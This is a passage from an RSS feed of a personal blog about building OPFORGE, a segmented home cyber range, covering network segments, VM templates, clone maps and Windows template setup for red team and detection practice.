&lt;/ul></description></item><item><title>Designing a Segmented Cyber Lab: OPFORGE Network Architecture</title><link>https://opforge.dev/posts/2024-05-25-opforge-network-design/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2024-05-25-opforge-network-design/</guid><description>&lt;h2 id="segments">Segments&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>CSOCINFRA (192.168.20.0/24)&lt;/strong>: Houses &lt;code>opf-log01&lt;/code> (SIEM) and &lt;code>opf-ai01&lt;/code> (ML detection)&lt;/li>
&lt;li>&lt;strong>LANWORKSTATIONS (192.168.30.0/24)&lt;/strong>: Contains &lt;code>opf-mbr01&lt;/code> and future endpoints&lt;/li>
&lt;li>&lt;strong>DMZRED (192.168.22.0/24)&lt;/strong>: Hosts attacker targets like &lt;code>opf-cloud01&lt;/code>&lt;/li>
&lt;li>&lt;strong>ADINFRA (192.168.40.0/24)&lt;/strong>: Supports &lt;code>opf-dc01&lt;/code> and GPO testing&lt;/li>
&lt;/ul>
&lt;h2 id="example-host-assignments">Example Host Assignments&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Host&lt;/th>
&lt;th>IP Address&lt;/th>
&lt;th>Segment&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>opf-fw01&lt;/td>
&lt;td>192.168.1.24 (WAN)&lt;/td>
&lt;td>pfSense router&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>opf-dc01&lt;/td>
&lt;td>192.168.40.100&lt;/td>
&lt;td>ADINFRA&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>opf-mbr01&lt;/td>
&lt;td>192.168.30.101&lt;/td>
&lt;td>LANWORKSTATIONS&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>opf-red01&lt;/td>
&lt;td>192.168.22.50&lt;/td>
&lt;td>DMZRED&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>opf-log01&lt;/td>
&lt;td>192.168.20.12&lt;/td>
&lt;td>CSOCINFRA&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table></description></item><item><title>From Sandbox to Cyber Range: How OPFORGE Evolved into a Professional Portfolio Lab</title><link>https://opforge.dev/posts/2024-05-25-opforge-infra-evolution/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2024-05-25-opforge-infra-evolution/</guid><description>&lt;p>OPFORGE began as a minimal cyber range with SOF-ELK and basic telemetry ingest, and has evolved into a segmented, multi-role portfolio lab for red team emulation, detection engineering, and AI-enhanced threat analysis.&lt;/p>
&lt;h2 id="evolution-timeline">Evolution Timeline&lt;/h2>
&lt;h3 id="phase-1-initial-sandbox">Phase 1: Initial Sandbox&lt;/h3>
&lt;ul>
&lt;li>Single VM (SOF-ELK)&lt;/li>
&lt;li>Flat network, no segmentation&lt;/li>
&lt;li>Manual log ingestion&lt;/li>
&lt;/ul>
&lt;h3 id="phase-2-tactical-expansion">Phase 2: Tactical Expansion&lt;/h3>
&lt;ul>
&lt;li>Added pfSense (&lt;code>opf-fw01&lt;/code>)&lt;/li>
&lt;li>Introduced segmentation: &lt;code>CSOCINFRA&lt;/code>, &lt;code>DMZRED&lt;/code>, &lt;code>LANWORKSTATIONS&lt;/code>, &lt;code>ADINFRA&lt;/code>&lt;/li>
&lt;li>First red team emulation with &lt;code>opf-red01&lt;/code>&lt;/li>
&lt;li>Winlogbeat and Sysmon on endpoints&lt;/li>
&lt;/ul>
&lt;h3 id="phase-3-professionalization">Phase 3: Professionalization&lt;/h3>
&lt;ul>
&lt;li>Cloned base templates (&lt;code>base-ubuntu-2204-template&lt;/code>, &lt;code>base-windows10-template&lt;/code>)&lt;/li>
&lt;li>VM-specific roles: &lt;code>opf-ai01&lt;/code>, &lt;code>opf-log01&lt;/code>, &lt;code>opf-mbr01&lt;/code>, etc.&lt;/li>
&lt;li>AI and ML integration via Jupyter (&lt;code>opf-ai01&lt;/code>)&lt;/li>
&lt;li>Multi-tiered ingest pipeline (Zeek → Logstash → OpenSearch)&lt;/li>
&lt;/ul>
&lt;h2 id="lessons-learned">Lessons Learned&lt;/h2>
&lt;ul>
&lt;li>Legacy OS images break modern tools&lt;/li>
&lt;li>Cloning base templates improves consistency&lt;/li>
&lt;li>Network segmentation is essential for realistic detection engineering&lt;/li>
&lt;/ul></description></item><item><title>OPFORGE Base Template Notes</title><link>https://opforge.dev/posts/opf-template-notes/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/opf-template-notes/</guid><description>&lt;h2 id="-base-templates-used-in-opforge">🧱 Base Templates Used in OPFORGE&lt;/h2>
&lt;p>This post outlines the two core VM templates used to clone all OPFORGE lab components. Each template is hardened, snapshot-ready, and optimized for its role.&lt;/p>
&lt;hr>
&lt;h3 id="-base-ubuntu-2204-template">🐧 &lt;code>base-ubuntu-2204-template&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 22.04 LTS (minimal ISO)&lt;/li>
&lt;li>&lt;strong>Usage&lt;/strong>: Source image for all Linux-based OPFORGE components&lt;/li>
&lt;li>&lt;strong>Configured With&lt;/strong>:
&lt;ul>
&lt;li>SSH key-based authentication&lt;/li>
&lt;li>&lt;code>ufw&lt;/code> firewall rules&lt;/li>
&lt;li>Preinstalled: Git, Python3, pip, htop, curl, net-tools&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Snapshot Label&lt;/strong>: &lt;code>ubuntu2204-clean-template&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="-base-windows10-template">🪟 &lt;code>base-windows10-template&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>OS&lt;/strong>: Windows 10 Pro 22H2 (fully patched)&lt;/li>
&lt;li>&lt;strong>Usage&lt;/strong>: Source image for domain-joined endpoints&lt;/li>
&lt;li>&lt;strong>Configured With&lt;/strong>:
&lt;ul>
&lt;li>Tools installed via &lt;code>Install-OPFORGE-WindowsTools.ps1&lt;/code>:
&lt;ul>
&lt;li>Sysmon, Winlogbeat, 7zip, VSCode, Sysinternals, Wireshark&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Bloatware removal and telemetry disabled&lt;/li>
&lt;li>Power settings and Start menu cleaned&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Snapshot Label&lt;/strong>: &lt;code>win10_22H2_tools_installed&lt;/code>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>Both templates are used to ensure consistency, repeatability, and portfolio-quality documentation across the OPFORGE environment.&lt;/p></description></item><item><title>OPFORGE VM Clone Map</title><link>https://opforge.dev/posts/opf-clone-map/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/opf-clone-map/</guid><description>&lt;h2 id="-cloned-vms-in-the-opforge-lab">🔁 Cloned VMs in the OPFORGE Lab&lt;/h2>
&lt;p>The following VMs are derived from the base templates and customized for their operational roles.&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Template&lt;/th>
&lt;th>Clone&lt;/th>
&lt;th>Role Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>&lt;code>opf-red01&lt;/code>&lt;/td>
&lt;td>Red Team operator + C2 lab&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>&lt;code>opf-log01&lt;/code>&lt;/td>
&lt;td>Log ingestion + OpenSearch stack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>&lt;code>opf-ai01&lt;/code>&lt;/td>
&lt;td>ML/AI detection modeling&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>&lt;code>opf-cloud01&lt;/code>&lt;/td>
&lt;td>Web app target in DMZRED&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-windows10-template&lt;/td>
&lt;td>&lt;code>opf-mbr01&lt;/code>&lt;/td>
&lt;td>Domain-joined endpoint (Win10)&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="-notes">🧠 Notes&lt;/h2>
&lt;ul>
&lt;li>Hostnames and static IPs are applied per segment&lt;/li>
&lt;li>Each VM is configured with dedicated virtual NICs&lt;/li>
&lt;li>Cloning process preserves snapshot state and configuration integrity&lt;/li>
&lt;/ul></description></item><item><title>Scaling OPFORGE: How I Clone and Manage Cyber Range VMs</title><link>https://opforge.dev/posts/2024-05-25-opforge-vm-cloning/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/2024-05-25-opforge-vm-cloning/</guid><description>&lt;h2 id="clone-map">Clone Map&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Template&lt;/th>
&lt;th>Clone Name&lt;/th>
&lt;th>Purpose&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>opf-red01&lt;/td>
&lt;td>Red Team operator box&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>opf-log01&lt;/td>
&lt;td>Log pipeline (Zeek, OpenSearch)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>opf-ai01&lt;/td>
&lt;td>Jupyter + anomaly detection&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-ubuntu-2204-template&lt;/td>
&lt;td>opf-cloud01&lt;/td>
&lt;td>Targeted web app for attack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>base-windows10-template&lt;/td>
&lt;td>opf-mbr01&lt;/td>
&lt;td>Domain-joined endpoint&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="lessons-learned">Lessons Learned&lt;/h2>
&lt;ul>
&lt;li>Clone from snapshot, then personalize (hostname, NIC, IP)&lt;/li>
&lt;li>Use base templates with all dependencies pre-installed&lt;/li>
&lt;li>Maintain consistency across VM builds using scripting and snapshots&lt;/li>
&lt;/ul></description></item><item><title>Windows 10 Template Setup for OPFORGE</title><link>https://opforge.dev/posts/windows-setup/</link><pubDate>Sun, 25 May 2025 00:00:00 +0000</pubDate><guid>https://opforge.dev/posts/windows-setup/</guid><description>&lt;p>This post documents the process of building and finalizing the &lt;strong>Windows 10 Pro 22H2&lt;/strong> template for use in the OPFORGE cyber lab environment.&lt;/p>
&lt;h2 id="-version--baseline">🛠️ Version &amp;amp; Baseline&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>OS&lt;/strong>: Windows 10 Pro 22H2 (fully patched as of 2025-05-25)&lt;/li>
&lt;li>&lt;strong>Build Source&lt;/strong>: Clean ISO install (22H2), upgraded from legacy 10240&lt;/li>
&lt;li>&lt;strong>Purpose&lt;/strong>: Golden template for domain-joined endpoint clones (&lt;code>opf-mbr01&lt;/code>, future victim hosts)&lt;/li>
&lt;/ul>
&lt;h2 id="-tool-installation-via-script">📦 Tool Installation via Script&lt;/h2>
&lt;p>After installation and patching, the following tools were installed using the custom script:&lt;/p></description></item></channel></rss>